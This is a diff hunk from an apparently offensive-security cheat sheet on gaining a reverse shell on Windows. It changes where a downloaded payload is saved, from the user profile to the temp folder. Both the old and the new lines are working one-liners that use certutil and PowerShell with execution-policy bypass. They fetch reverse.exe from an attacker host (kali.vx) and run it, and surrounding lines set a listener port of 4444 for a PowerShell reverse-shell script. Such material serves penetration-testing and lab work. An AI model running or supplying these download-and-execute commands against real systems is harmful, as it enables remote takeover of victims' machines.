@@ -63,13 +63,13 @@ sed -i 's/<PORT>/4444/' reverse.ps1
 ### Using certutil
 
 ```console
-certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %USERPROFILE%\reverse.exe && %USERPROFILE%\reverse.exe
+certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %TEMP%\reverse.exe && %TEMP%\reverse.exe
 ```
 
 ### Using PowerShell
 
 ```console
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%USERPROFILE%\reverse.exe'); Start-Process %USERPROFILE%\reverse.exe
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%TEMP%\reverse.exe'); Start-Process %TEMP%\reverse.exe
 ```
 
 ## 2.2. Execute PowerShell-based reverse shell script
